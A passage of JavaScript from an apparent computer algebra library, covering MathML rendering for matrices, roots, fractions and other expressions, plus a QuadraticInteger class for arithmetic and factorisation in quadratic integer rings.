  return (sign < 0 ? "<mrow>" : "") + (sign < 0 ? "<mo>&minus;</mo>" : "") + "<mn>" + number + "</mn>" + (sign < 0 ? "</mrow>" : "");
};
var complexToMathML = function (real, imaginary) {
  return '<mrow>' + real + (imaginary.indexOf('<mo>&minus;</mo>') !== -1 ? '<mo>&minus;</mo>' : '<mo>+</mo>') + (imaginary !== '' ? imaginary.replace(/<mrow><mo>&minus;<\/mo><mn>([^<]*)<\/mn><\/mrow>/g, '<mn>$1</mn>') + '<mo>&it;</mo>' : '') + '<mi>&ii;</mi>' + '</mrow>';
};

  function isConstant(e) {
    if (e instanceof Expression.Symbol) {
      return false;
    }
    if (e instanceof Expression.NonSimplifiedExpression) {
      return false;
    }
    if (e instanceof Expression.Matrix) {
      return false;
    }
    if (e instanceof Expression.Polynomial) {
      return false;
    }
    if (e instanceof Expression.BinaryOperation) {
      return (e.a === Expression.E || isConstant(e.a)) && isConstant(e.b);
    }
    if (e instanceof Expression.Negation) {
      return isConstant(e.b);
    }
    if (e instanceof Expression.Function) {
      return isConstant(e.a);
    }
    return true;
  }

//TODO: move
Expression.toDecimalString = function (x, options) {
  var fractionDigits = options != null ? options.fractionDigits : -1;
  if (fractionDigits >= 0 && isConstant(x)) {
    return toDecimalStringInternal(x, fractionDigits, decimalToMathML, complexToMathML);
  }
  return undefined;
};

var getPrecedence = function (x, options) {
  var fractionDigits = options != null ? options.fractionDigits : -1;
  if (fractionDigits >= 0 && isConstant(x) && Expression.has(x, Expression.Complex)) {
    return new Expression.Addition(Expression.ONE, Expression.ONE).getPrecedence();
  }
  return x.getPrecedence();
};

Expression.idCounter = 0;
Expression.id = function () {
  return (Expression.idCounter += 1).toString();
};

//TODO: ?
Expression.escapeHTML = function (s) {
  return s.replace(/&/g, "&amp;")
          .replace(/"/g, "&quot;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;");
};

Expression.Matrix.prototype.toMathML = function (options) {
  var x = this.matrix;
  options = Expression.setTopLevel(true, options);

  var useMatrixContainer = options.useMatrixContainer == undefined ? true : options.useMatrixContainer;
  //TODO: fix!
  var braces = options.useBraces == undefined ? undefined : options.useBraces;
  var columnlines = options.columnlines == undefined ? 0 : options.columnlines;
  var variableNames = options.variableNames == undefined ? undefined : options.variableNames;

  var verticalStrike = options.verticalStrike == undefined ? -1 : options.verticalStrike;
  var horizontalStrike = options.horizontalStrike == undefined ? -1 : options.horizontalStrike;

  var cellIdGenerator = options.cellIdGenerator == undefined ? undefined : options.cellIdGenerator;
  var pivotCell = options.pivotCell == undefined ? undefined : options.pivotCell;

  var isLUDecomposition2 = options.isLUDecomposition2 == undefined ? undefined : options.isLUDecomposition2;
  var highlightRow = options.highlightRow == undefined ? -1 : options.highlightRow;
  var highlightCol = options.highlightCol == undefined ? -1 : options.highlightCol;

  options = Object.assign({}, options, {
    useBraces: undefined,
    columnlines: undefined,
    variableNames: undefined,
    verticalStrike: undefined,
    horizontalStrike: undefined,
    cellIdGenerator: undefined,
    pivotCell: undefined,
    isLUDecomposition2: undefined,
    highlightRow: undefined,
    highlightCol: undefined
  });

  var result = "";
  var rows = x.rows();
  var cols = x.cols();
  var i = -1;

  //TODO: remove `Expression.id()`
  var containerId = options.idPrefix + "-" + Expression.id();
  if (useMatrixContainer) {
    result += "<munder>";
    result += "<menclose notation=\"none\" id=\"" + containerId + "\" data-matrix=\"" + Expression.escapeHTML(x.toString()) + "\" draggable=\"true\" tabindex=\"0\" contextmenu=\"matrix-menu\">";
  }

  result += braces == undefined ? '<mrow><mo>(</mo>' : '<mrow>' + (braces[0] === ' ' ? '' : '<mo>' + braces[0] + '</mo>');
  var columnlinesAttribute = "";
  if (columnlines !== 0 && cols - 1 > 0) {
    var k = -1;
    while (++k < cols - 1) {
      columnlinesAttribute += (cols - 1 + columnlines === k ? "solid " : "none ");
    }
    // whitespace
    columnlinesAttribute = columnlinesAttribute.slice(0, -1);
  }
  //! 2017-07-06 rowspacing="0ex" was added to make it look better with Native MathML (when it is supported) and to have the same style as in mathml.css
  var useColumnspacing = verticalStrike !== -1 || horizontalStrike !== -1 || pivotCell != undefined || cellIdGenerator != undefined;
  result += "<mtable" + (useColumnspacing ? " rowspacing=\"0ex\"" + " columnspacing=\"0em\"" : " rowspacing=\"0ex\"") + (variableNames != undefined ? " columnalign=\"right\"" : "") + (columnlinesAttribute !== "" ? " columnlines=\"" + columnlinesAttribute + "\"" : "") + ">";
  while (++i < rows) {
    var j = -1;
    if (variableNames != undefined) {// TODO: fix?
      //TODO: use code from polynomialToExpression3 (shared)
      var row = "";
      var wasNotZero = false;
      while (++j < cols - 1) {
        // TODO: fix `new Expression.Symbol()`
        row += "<mtd>";
        row += printPartOfAddition(j === cols - 2, !wasNotZero, x.e(i, j), new Expression.Symbol(variableNames[j]), options);
        row += "</mtd>";
        wasNotZero = wasNotZero || !x.e(i, j).equals(Expression.ZERO);
      }
      row += "<mtd><mo>=</mo></mtd><mtd>" + x.e(i, cols - 1).toMathML(options) + "</mtd>";
      if (wasNotZero || !x.e(i, cols - 1).equals(Expression.ZERO)) {
        result += "<mtr>";
        result += row;
        result += "</mtr>";
      }
    } else {
      result += "<mtr>";
      while (++j < cols) {
        result += "<mtd" + (cellIdGenerator != undefined ? " id=\"" + cellIdGenerator(i, j) + "\"" : "") + ">";
        if (pivotCell != undefined && i === pivotCell.i && j === pivotCell.j) {
          result += "<mstyle mathvariant=\"bold\">";
          result += "<menclose notation=\"circle\">";
        }
        if (verticalStrike === j || horizontalStrike === i) {
          var notation = ((verticalStrike === j ? " " + "verticalstrike" : "") +
                          (horizontalStrike === i ? " " + "horizontalstrike" : "")).slice(1);
          result += "<menclose notation=\"" + notation + "\">";
        }
        if (useColumnspacing) {
          result += "<mpadded width=\"+0.8em\" lspace=\"+0.4em\">";
        }
        var highlight = j < i && isLUDecomposition2 ||
                        highlightRow === i && (columnlines === 0 || j <= cols - 1 + columnlines) || highlightCol === j;
        if (highlight) {
          result += "<mrow mathbackground=\"#80FF80\">";
        }
        result += x.e(i, j).toMathML(options);
        if (highlight) {
          result += "</mrow>";
        }
        if (useColumnspacing) {
          result += "</mpadded>";
        }
        if (verticalStrike === j || horizontalStrike === i) {
          result += "</menclose>";
        }
        if (pivotCell != undefined && i === pivotCell.i && j === pivotCell.j) {
          result += "</menclose>";
          result += "</mstyle>";
        }
        result += "</mtd>";
      }
      result += "</mtr>";
    }
  }
  result += "</mtable>";
  result += braces == undefined ? '<mo>)</mo></mrow>' : (braces[1] === ' ' ? '' : '<mo>' + braces[1] + '</mo>') + '</mrow>';

  if (useMatrixContainer) {
    result += "</menclose>";

    result += "<mtext>";
    result += "<button type=\"button\" class=\"matrix-menu-show\" data-for-matrix=\"" + containerId + "\" aria-haspopup=\"true\"></button>";
    result += "</mtext>";

    result += "</munder>";
  }

  return result;
};

Expression.Determinant.prototype.toMathML = function (options) {
  var x = this;
  if (x.a instanceof Expression.Matrix || (x.a instanceof NonSimplifiedExpression && x.a.e instanceof Expression.Matrix)) {
    options = Object.assign({}, options, {
      useBraces: ["|", "|"]
    });
    //TODO: fix
    return x.a.toMathML(options);
  }
  return "<mrow><mo>|</mo>" + x.a.toMathML(options) + "<mo>|</mo></mrow>";
};
Expression.Transpose.prototype.toMathML = function (options) {
  var x = this;
  //TODO: ^T ?
  // https://www.w3.org/TR/MathML3/chapter4.html#contm.transpose
  return "<msup>" +
         x.a.toMathML(options) +
         "<mi>T</mi>" +
         "</msup>";
};
Expression.SquareRoot.prototype.toMathML = function (options) {
  var d = Expression.toDecimalString(this, options);
  if (d != undefined) {
    return d;
  }
  return "<msqrt>" +
         this.a.toMathML(Expression.setTopLevel(true, options)) +
         "</msqrt>";
};
Expression.CubeRoot.prototype.toMathML = function (options) {
  var d = Expression.toDecimalString(this, options);
  if (d != undefined) {
    return d;
  }
  return "<mroot>" +
         this.a.toMathML(Expression.setTopLevel(true, options)) +
         "<mi>" + 3 + "</mi>" +
         "</mroot>";
};
Expression.NthRoot.prototype.toMathML = function (options) {
  var d = Expression.toDecimalString(this, options);
  if (d != undefined) {
    return d;
  }
  return "<mroot>" +
         this.a.toMathML(Expression.setTopLevel(true, options)) +
         "<mi>" + this.n + "</mi>" +
         "</mroot>";
};
Expression.Function.prototype.toMathML = function (options) {
  var x = this;
  var fa = !(x.a instanceof Expression.Matrix) && !(x.a instanceof NonSimplifiedExpression && x.a.e instanceof Expression.Matrix);//?
  //TODO: fix
  return "<mrow>" +
         (typeof i18n !== "undefined" ? "<mi>" + (x.name === "rank" ? i18n.rankDenotation : (x.name === "sin" ? i18n.sinDenotation : (x.name === "tan" ? i18n.tanDenotation : x.name))) + "</mi>" : "<mi>" + x.name + "</mi>") +
         "<mo>&af;</mo>" +
         (fa ? "<mrow><mo>(</mo>" : "") +
         x.a.toMathML(Expression.setTopLevel(true, options)) +
         (fa ? "<mo>)</mo></mrow>" : "") +
         "</mrow>";
};
Expression.Division.prototype.toMathML = function (options) {
  if (options != null && options.nofractions) {
    return Expression.BinaryOperation.prototype.toMathML.call(this, options);
  }
  var d = Expression.toDecimalString(this, options);
  if (d != undefined) {
    return d;
  }
  var x = this;
  var denominator = x.getDenominator();
  var numerator = x.getNumerator();
  //???
  //if (numerator.isNegative()) {
  //  return "<mrow><mo>&minus;</mo>" + x.negateCarefully().toMathML(options) + "</mrow>";
  //}
  return "<mfrac>" +
         numerator.toMathML(Expression.setTopLevel(true, options)) + 
         denominator.toMathML(Expression.setTopLevel(true, options)) +
         "</mfrac>";
};

Expression.Integer.prototype.toMathML = function (options) {
  var d = Expression.toDecimalString(this, options);
  if (d != undefined) {
    return d;
  }
  var x = this;
  var tmp = x.toString();
  return tmp.slice(0, 1) === "-" ? "<mrow>" + "<mo>&minus;</mo>" + "<mn>" + tmp.slice(1) + "</mn>" + "</mrow>" : "<mn>" + tmp + "</mn>";
};
Expression.BinaryOperation.prototype.toMathML = function (options) {
  if (options != null &&
      options.fractionDigits >= 0 &&
      this.unwrap() instanceof Expression.Exponentiation &&
      this.unwrap().a.unwrap() instanceof Expression.Symbol &&
      this.unwrap().a.unwrap() !== Expression.E &&
      (this.unwrap().b.unwrap() instanceof Expression.Integer || this.unwrap().b.unwrap() instanceof Expression.Negation && this.unwrap().b.unwrap().b.unwrap() instanceof Expression.Integer)) {
    options = Object.assign({}, options, {fractionDigits: -1});
  }
  var d = Expression.toDecimalString(this, options);
  if (d != undefined) {
    return d;
  }

  //!2019-05-16
  if (this instanceof Expression.Addition) {
    var s = [];
    var b = null;
    for (var additions = this.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      if (b != null) {
        var n = false;
        if (b.isNegative()) {
          n = true;
          b = b.negateCarefully();
        }
        var fence = this.getPrecedence() >= getPrecedence(b, options);
        fence = fence || b.isUnaryPlusMinus();
        s.push((fence ? '<mrow><mo>(</mo>' : '') + b.toMathML(Expression.setTopLevel(fence, options)) + (fence ? '<mo>)</mo></mrow>' : ''));
        s.push(n ? '<mo>&minus;</mo>' : '<mo>+</mo>');
      }
      b = x;
    }
    s = s.reverse().join('');
    var a = b;
    var fence = a.getPrecedence() + (a.isRightToLeftAssociative() ? -1 : 0) < this.getPrecedence();
    if (options != undefined && options.isTopLevel != undefined && options.isTopLevel === false) {
      fence = fence || a.isUnaryPlusMinus();
    }
    s = (fence ? "<mrow><mo>(</mo>" : "") + a.toMathML(Expression.setTopLevel(fence || options == undefined || options.isTopLevel, options)) + (fence ? "<mo>)</mo></mrow>" : "") + s;
    return '<mrow>' + s + '</mrow>';
  }

  //!
  var a = this.a;
  var b = this.b;
  var isSubtraction = false;
  // TODO: check
  if (this instanceof Expression.Addition && b.isNegative()) {
    isSubtraction = true;
    b = b.negateCarefully();//?
  }

  var fa = a.getPrecedence() + (a.isRightToLeftAssociative() ? -1 : 0) < this.getPrecedence();
  var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();
  if (options != undefined && options.isTopLevel != undefined && options.isTopLevel === false) {
    fa = fa || a.isUnaryPlusMinus();
  }
  fb = fb || b.isUnaryPlusMinus();
  fb = fb || (this.unwrap() instanceof Expression.Exponentiation && b.unwrap() instanceof Expression.Exponentiation);// 2^3^4
  fa = fa || (this.unwrap() instanceof Expression.Exponentiation && a.unwrap() instanceof Expression.Function); // cos(x)^(2+3)
  var s = isSubtraction ? "-" : this.getS();

  if (this instanceof Expression.Exponentiation) {
    if (a.unwrap() === Expression.E && b.unwrap() instanceof Expression.Matrix) {
      return '<mrow><mi>exp</mi><mo>&af;</mo>' + b.toMathML(options) + '</mrow>';
    }
    var boptions = options;
    if (!(a.unwrap() instanceof Expression.Matrix)) {
      boptions = Object.assign({}, options || {}, {nofractions: true});
    }

      return "<msup>" + 
             (fa ? "<mrow><mo>(</mo>" : "") + a.toMathML(Expression.setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? "<mo>)</mo></mrow>" : "") +
             (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, boptions)) + (fb ? "<mo>)</mo></mrow>" : "") + 
             "</msup>";
  }
  if (this.isNegation()) {
    // assert(fa === false);
      return "<mrow><mo>&minus;</mo>" + (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, options)) + (fb ? "<mo>)</mo></mrow>" : "") + "</mrow>";
  }  
  //TODO: fix spaces (matrix parsing)
  return "<mrow>" + 
         (fa ? "<mrow><mo>(</mo>" : "") + a.toMathML(Expression.setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? "<mo>)</mo></mrow>" : "") +
         (s === '*' ? '<mo>&times;</mo>' : (s === '-' ? '<mo>&minus;</mo>' : (s === '/' ? '<mo>&#x2215;</mo>' : '<mo>' + s + '</mo>'))) +
         (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, options)) + (fb ? "<mo>)</mo></mrow>" : "") + 
         "</mrow>";
};

Expression.Symbol.prototype.toMathML = function (options) {
  var x = this;
  var s = x.symbol;
  var i = s.indexOf("_");
  if (i !== -1) {
    var indexes = s.slice(i + 1).replace(/^\(|\)$/g, "").split(",");
    var indexesMathML = "";
    for (var j = 0; j < indexes.length; j += 1) {
      indexesMathML += (j !== 0 ? "<mo>,</mo>" : "") +
                       (/^\d+$/.exec(indexes[j]) != undefined ? "<mn>" : "<mi>") +
                       indexes[j] +
                       (/^\d+$/.exec(indexes[j]) != undefined ? "</mn>" : "</mi>");
    }
    if (indexes.length > 1) {
      indexesMathML = "<mrow>" + indexesMathML + "</mrow>";
    }
    return "<msub>" + 
           "<mi>" + s.slice(0, i) + "</mi>" +
           indexesMathML +
           "</msub>";
  }
  return "<mi>" + s + "</mi>";
};
Expression.Negation.prototype.toMathML = function (options) {
  var b = this.b;
  var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();
  fb = fb || b.isUnaryPlusMinus();
  // assert(fa === false);
  return "<mrow><mo>&minus;</mo>" + (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, options)) + (fb ? "<mo>)</mo></mrow>" : "") + "</mrow>";
};

Condition.prototype.toMathML = function (options) {
  if (this === Condition.TRUE || this === Condition.FALSE) {
    // 1) no need; 2) no way to distinguish TRUE and FALSE
    throw new TypeError();
  }
  if (this.array.length === 0) {
    // assertion
    throw new TypeError();
  }
  var s = '';
  for (var i = 0; i < this.array.length; i += 1) {
    s += (i !== 0 ? '<mo>,</mo>' : '');
    s += '<mrow>';
    s += this.array[i].expression.toMathML(options) + (this.array[i].operator === Condition.NEZ ? '<mo>&ne;</mo><mn>0</mn>' : '') + (this.array[i].operator === Condition.EQZ ? '<mo>=</mo><mn>0</mn>' : '');
    s += '</mrow>';
  }
  return this.array.length === 1 ? s : '<mrow>' + s + '</mrow>';
};

Expression.Complex.prototype.toMathML = function (options) {
  return this.toStringInternal(options, "<mo>&it;</mo>", "<mi>&ii;</mi>", "<mo>&minus;</mo>", "<mo>+</mo>", "<mrow>", "</mrow>", function (x, options) { return x.toMathML(options); });
};

Expression.GF2.prototype.toMathML = function (options) {
  //TODO: fix
  return this.a.toMathML(options);
};
Expression.GF2Value.prototype.toMathML = function (options) {
  return "<mrow>" + "<mn>" + this.value.toString() + "</mn>" + "</mrow>";
};
Expression.Degrees.prototype.toMathML = function (options) {
  return "<mrow>" + this.value.toMathML(options) + "<mo>&it;</mo><mi>&deg;</mi></mrow>";
};

NonSimplifiedExpression.prototype.toMathML = function (options) {
  //?
  //options = options.fractionDigits >= 0 ? Object.assign({}, options, {fractionDigits: -1}) : options;
  if (options != null && options.printId != undefined) {
    return "<mrow id=\"" + this.getId() + "\">" + this.e.toMathML(options) + "</mrow>";
  }
  return this.e.toMathML(options);
};
  
Expression.prototype.toMathML = function (options) {
  throw new TypeError();
};

})();
(function () {
"use strict";
// https://en.wikipedia.org/wiki/Quadratic_integer
// https://en.wikipedia.org/wiki/Factorization#Unique_factorization_domains
/*global Expression*/





/*

      if (qi instanceof QuadraticInteger && qi.a < 0 || qi.b < 0) {
        var c = pow(qi.conjugate(), n, new QuadraticInteger(1, 0, qi.D));
        return qi.multiply(c).toExpression()._nthRoot(n).divide(new QuadraticInteger(Math.abs(qi.a), Math.abs(qi.b), qi.D).toExpression());
      }

*/

  function ngcd(a, b) {
    while (b != 0) {
      var t = a % b;
      a = b;
      b = t;
    }
    return a;
  }

// a + b*sqrt(D)
function QuadraticInteger(a, b, D) {
  //TODO:
  if (typeof a === "number" && Math.abs(a) > 9007199254740991) {
    throw new TypeError();
  }
  if (typeof b === "number" && Math.abs(b) > 9007199254740991) {
    throw new TypeError();
  }
  this.a = a;
  this.b = b;
  this.D = D;
}
QuadraticInteger.prototype.multiply = function (y) {
  var x = this;
  if (x.D !== y.D) {
    throw new TypeError();
  }
  var t = function (value) {
    if (typeof a === "number" && Math.abs(a) > 9007199254740991) {
      throw new TypeError();
    }
    return value;
  };
  return new QuadraticInteger(t(x.a * y.a) + t(x.b * y.b * y.D), t(x.a * y.b) + t(x.b * y.a), x.D);
};
QuadraticInteger.prototype.conjugate = function (y) {
  return new QuadraticInteger(this.a, -this.b, this.D);
};
QuadraticInteger.prototype.norm = function () {
  //var x = this.a * this.a;
  //var y = this.b * this.b;
  //return x % this.D + (((x - x % this.D) / this.D) - y) * this.D;
  var a = BigInteger.BigInt(this.a);
  var b = BigInteger.BigInt(this.b);
  var D = BigInteger.BigInt(this.D);
  var aa = BigInteger.multiply(a, a);
  var bb = BigInteger.multiply(b, b);
  var norm = BigInteger.toNumber(BigInteger.subtract(aa, BigInteger.multiply(bb, D)));
  if (typeof norm === "number" && Math.abs(norm) > 9007199254740991) {
    throw new TypeError();
  }
  return norm;
};
QuadraticInteger.prototype.truncatingDivideInteger = function (x) {
  return new QuadraticInteger(x.toBigInt(), Expression.ZERO.toBigInt(), this.D).truncatingDivide(this);
};
QuadraticInteger.prototype.truncatingDivide = function (y) {
  if (!(y instanceof QuadraticInteger)) {
    if (y instanceof AlmostQuadraticInteger) {
      return null;
    }
    y = new QuadraticInteger(y.toBigInt(), Expression.ZERO.toBigInt(), this.D);
  }
  var x = this;
  if (x.D !== y.D) {
    throw new TypeError();
  }
  var n = x.multiply(y.conjugate());
  var d = y.norm();
  return n.a % d == 0 && n.b % d == 0 ? new QuadraticInteger(n.a / d, n.b / d, x.D) : null;
};
QuadraticInteger.prototype.negate = function () {
  return new QuadraticInteger(-this.a, -this.b, this.D);
};

/*
function primeFactor(n) {
  var i = n - n;
  ++i;
  ++i;
  if (n % i == 0) {
    return i;
  }
  ++i;
  while (i * i <= n) {
    if (n % i == 0) {
      return i;
    }
    ++i;
    ++i;
  }
  return n;
}
*/
function primeFactorX(n) {
  if (typeof n !== "number") {
    return BigInt(primeFactor(BigInteger.BigInt(n.toString())));
  }
  return primeFactor(BigInteger.BigInt(n));
}
function factors(n) {
  if (n < 1) {
    throw new TypeError();
  }
  var p = n > 1 ? primeFactorX(n) : n / n;
  var t = n / n;
  var f = null;
  var fs = null;
  var i = n / n;
  return {
    //[Symbol.iterator]: function () {
    //  return this;
    //},
    //get done() {
    //  return this.value == null;
    //},
    value: null,
    next: function () {
      if (p == 1) {
        this.value = null;
        return this;
      }
      if (fs == null) {
        if (n % p == 0) {
          t *= p;
          n /= p;
          this.value = t;
          return this;
        }
        fs = factors(n);
        i = t;
      }
      if (i === t) {
        i = i / i;
        f = fs.next().value;
      } else {
        i *= p;
      }
      this.value = f == null ? null : f * i;
      return this;
    }
  };
}

QuadraticInteger._factors = function (n) {
  return factors(n);
};

function abs(a) {
  return a < 0 ? -a : (a - a) + a;
}

QuadraticInteger.prototype.primeFactor = function () {

  function gcd(a, b) {
    return b == 0 ? a : gcd(b, a % b);
  }

  function sqrt(n) {
    //?
    if (typeof n === "number") {
      return Math.floor(Math.sqrt(n));
    }
    return BigInt(nthRoot(BigInteger.BigInt(n.toString()), 2).toString());
  }

  var a = this.a;
  var b = this.b;
  var D = this.D;
  if (g == D) {//TODO: g != 1 - ?
    return new QuadraticInteger(a - a, b / b, g);
  }
  var g = abs(gcd(a, b));
  if (g != 1) {
    //TODO:
    //return new QuadraticInteger(primeFactor(Math.abs(g)), 0, D);
    return new QuadraticInteger(QuadraticInteger._factors(g).next().value, b - b, D);
  }
  var g = abs(gcd(a, D));
  var norm = this.norm();
  function quadraticIntegers(norm, D, b) {
    while (true) {
      if (typeof norm === "number") {//TODO: 
      if (-norm + D * b * b > 9007199254740991 || norm + D * b * b > 9007199254740991) {
        throw new RangeError(norm);
      }
      }
      var guess = norm + D * b * b;
      if (guess >= 0) {
        var a = sqrt(guess);
        if (guess === a * a) { // && Math.abs(gcd(a, b)) === 1
          return new QuadraticInteger(a, b, D);
        }
      }
      var guess = -norm + D * b * b;
      if (guess >= 0) {
        var a = sqrt(guess);
        if (guess === a * a) { // && Math.abs(gcd(a, b)) === 1
          return new QuadraticInteger(a, b, D);
        }
      }
      ++b;
    }
  }
  if (a == 0 || b == 0) {
    return this;
  }
  if (norm == 1 || norm == -1) {
    // https://en.wikipedia.org/wiki/Quadratic_field#Orders_of_quadratic_number_fields_of_small_discriminant
    var unit = quadraticIntegers(D / D, D, D / D);
    var uniti = unit.conjugate();
    var x = this;
    if (x.b * x.a < 1) {
      return x.a < 0 ? uniti.negate() : uniti;
    }
    return unit;
  }

  var v = this;
  for (var fs = factors(abs(norm)), p = fs.next().value; p != null; p = fs.next().value) {
    // ? https://www.johndcook.com/blog/2008/11/17/fast-way-to-test-whether-a-number-is-a-square/
    /*if (D === 17) {
      var t = Math.abs(norm);
      while (t % 2 === 0) {
        t /= 2;
      }
      p = t === 1 ? norm : primeFactor(t);
    }*/
    if (p == 2 && (D == 5 || D == 13 || D == 17 || D == 21 || D == 29 || D == 33 || D == 41 || D == 57)) {
      //p = 4;
      p = p - p;
      ++p;
      ++p;
      ++p;
      ++p;
    }
    var i = quadraticIntegers(p, D, D - D);
    //console.log(i + '');
    var x = v.truncatingDivide(i);
    if (x != null) {
      return i;
    }
    var x = v.truncatingDivide(i.conjugate());
    if (x != null) {
      return i.conjugate();
    }// 1+9sqrt(2)
  }
  //console.log('!');
  return this;
  //throw new TypeError();
};
QuadraticInteger.prototype.toString = function () {
  return this.a + '+' + this.b + 'sqrt(' + this.D + ')';
};
QuadraticInteger.prototype.isUnit = function () {
  var n = this.norm();
  return n == 1 || n == -1;
};
QuadraticInteger.prototype.equals = function (y) {
  var x = this;
  if (y.equals(Expression.ZERO)) {
    return x.a == 0 && x.b == 0;
  }
  if (y.equals(Expression.ONE)) {
    return x.a == 1 && x.b == 0;
  }
  if (!(y instanceof QuadraticInteger)) {
    throw new TypeError();
  }
  return x.a === y.a && x.b === y.b && x.D === y.D;
};
QuadraticInteger.prototype.subtract = function (y) {
  var x = this;
  if (x.D !== y.D) {
    throw new TypeError();
  }
  return new QuadraticInteger(x.a - y.a, x.b - y.b, x.D);
};
QuadraticInteger.prototype.isDivisibleBy = function (y) {
  if (y instanceof AlmostQuadraticInteger) {
    var q = this.truncatingDivide(y.qi);
    return q == null ? null : q.truncatingDivide(y.k);
  }
  return this.truncatingDivide(y) != null;
};
QuadraticInteger.prototype.isDivisibleByInteger = function (x) {
  return x.truncatingDivide(this) != null;
};
QuadraticInteger.prototype.remainder = function (y) {
  if (!(y instanceof QuadraticInteger)) {
    if (y instanceof AlmostQuadraticInteger) {
      if (ngcd(this.a, this.b) != 0) {
        //?TODO:
      }
      var nk = y.k;
      var remainder = this.remainder(y.qi);
      if (remainder.equals(Expression.ZERO)) {
        return remainder;
      }
      if (remainder.b == 0) {
        return nk;
      }
      if (abs(ngcd(remainder.a, remainder.b)) != 1) {
        var i = Expression.Integer.fromBigInt(abs(ngcd(remainder.a, remainder.b)));
        nk = nk.multiply(i);
        remainder = remainder.truncatingDivide(i);
      }
      return new AlmostQuadraticInteger(nk, remainder);
    }
    if (y instanceof Expression.Multiplication && y.a instanceof Expression.Integer && y.b instanceof Expression.SquareRoot) {
      return this.remainder(new QuadraticInteger(Expression.ZERO.toBigInt(), y.a.toBigInt(), y.b.a.toBigInt()));
    }
    y = new QuadraticInteger(y.toBigInt(), Expression.ZERO.toBigInt(), this.D);
  }
  var x = this;
  if (x.D !== y.D) {
    throw new TypeError();
  }
  var n = x.multiply(y.conjugate());
  var d = y.norm();
  if (d == 1 || d == -1) { // y.isUnit()
    return x.subtract(x);
  }
  var q1 = (n.a - n.a % d) / d;
  var q2 = (n.b - n.b % d) / d;
  if (q1 == 0 && q2 == 0) {
    if (abs(x.norm()) >= abs(y.norm())) {
      //?
      if (x.a > y.a && y.a > 0) {
        return x.subtract(y.multiply(new QuadraticInteger((x.a - x.a % y.a) / y.a, x.D - x.D, x.D)));
      }
      if (x.a > -y.a && y.a < 0) {
        return x.subtract(y.multiply(new QuadraticInteger((x.a - x.a % -y.a) / -y.a, x.D - x.D, x.D)));
      }
      if (y.b == 0) {
        return new QuadraticInteger(x.D.constructor(1), x.D - x.D, x.D);//?
      }
    throw new RangeError("NotSupportedError");//TODO:!!!
    }
  }
  var q = new QuadraticInteger(q1, q2, x.D);
  return x.subtract(y.multiply(q));
};
QuadraticInteger.prototype.remainderInteger = function (x) {
  return new QuadraticInteger(x.toBigInt(), Expression.ZERO.toBigInt(), this.D).remainder(this);
};
QuadraticInteger.prototype.toExpression = function () {
  return Expression.Integer.fromBigInt(this.a).add(Expression.Integer.fromBigInt(this.b).multiply(Expression.Integer.fromBigInt(this.D).squareRoot()));
};

//TODO: merge with the QuadraticInteger.toQuadraticInteger
QuadraticInteger.prototype.isValid = function () {
  var qq = this;
  //TODO: 6, 21, 33, 37, 57, 73
  if (' 2, 3, 5, 7, 11, 13, 17, 19, 29, 41, 6, 21, 33, 57,'.indexOf(' ' + qq.D + ',') === -1) { // https://oeis.org/A048981
    return false;
  }
  var g = qq != null ? ngcd(qq.a, qq.b) : null;
  //var g = 1;
  //return (typeof qq.a === "bigint" || (qq.a / g) * (qq.a / g) < 9007199254740991 && (qq.b / g) * (qq.b / g) < 9007199254740991);
  return true;
};
QuadraticInteger.prototype.isPositive = function () {
  var qq = this;
  return qq.a > 0 && qq.b > 0 || qq.a > 0 && qq.norm() > 0 || qq.b > 0 && qq.norm() < 0;
};

self.QuadraticInteger = QuadraticInteger;


// new QuadraticInteger(1, 1, 2).remainder(new QuadraticInteger(1, 1, 2))
// new QuadraticInteger(2, 2, 2).truncatingDivide(new QuadraticInteger(2, 2, 2))

//!
function toQuadraticInteger(e) {
  if (e instanceof Expression.Addition) {
    var g = e.a.gcd(e.b);
    if (!g.equals(Expression.ONE)) {
      var qi = toQuadraticInteger(e.divide(g));
      return qi == null ? null : new AlmostQuadraticInteger(g, qi);
    }
  }
  // qq.a * qq.a + qq.D * qq.b * qq.b < 9007199254740991
  if (e instanceof Expression.Addition &&
      e.b instanceof Expression.Integer &&
      e.a instanceof Expression.SquareRoot &&
      e.a.a instanceof Expression.Integer) {
    return new QuadraticInteger(e.b.toBigInt(), Expression.ONE.toBigInt(), e.a.a.toBigInt());
  }
  if (e instanceof Expression.Addition &&
      e.b instanceof Expression.Integer &&
      e.a instanceof Expression.Multiplication &&
      e.a.a instanceof Expression.Integer &&
      e.a.b instanceof Expression.SquareRoot &&
      e.a.b.a instanceof Expression.Integer) {
    return new QuadraticInteger(e.b.toBigInt(), e.a.a.toBigInt(), e.a.b.a.toBigInt());
  }
}
//!

QuadraticInteger.toQuadraticInteger = toQuadraticInteger;

/*
QuadraticInteger.prototype.compareTo = function (e) {
  if (e === Expression.ZERO) {
    var n = this.a * this.a - this.b * this.b * this.D;
    return this.a === 0 && this.b === 0 ? 0 : (this.a < 0 && this.b < 0 || this.a < 0 && n > 0 || this.b < 0 && n < 0 ? -1 : 1);
  }
  if (e === Expression.ONE) {
    return this.a === 1 && this.b === 0 ? 0 : 1;
  }
  throw new TypeError();
};
*/



  //

/*

    if (n === 2) {
      function gcd(a, b) {
        return b === 0 ? a : gcd(b, a % b);
      }
      var q = isQuadraticInteger(x);
      //TODO: (q.D === 2 || q.D === 3 || q.D === 5 || q.D === 17)
      
      if (q != null && q.D === 2 && Math.abs(q.a * q.a - q.b * q.b * q.D) === Math.pow(gcd(q.a, q.b), 2)) {
        var ff = Expression.ONE;
        if (q.a % q.D === 0) {
          q = {
            a: q.b,
            b: Math.floor(q.a / q.D),
            D: q.D
          };
          ff = new SquareRoot(new Integer(q.D));
          x = x.divide(ff);
        }
        var n = q.a * q.a - q.b * q.b * q.D;
        if (q.a > 0 && q.b > 0 || q.a > 0 && n > 0 || q.b > 0 && n < 0) {
          var t = new QuadraticInteger(q.a, q.b, q.D);
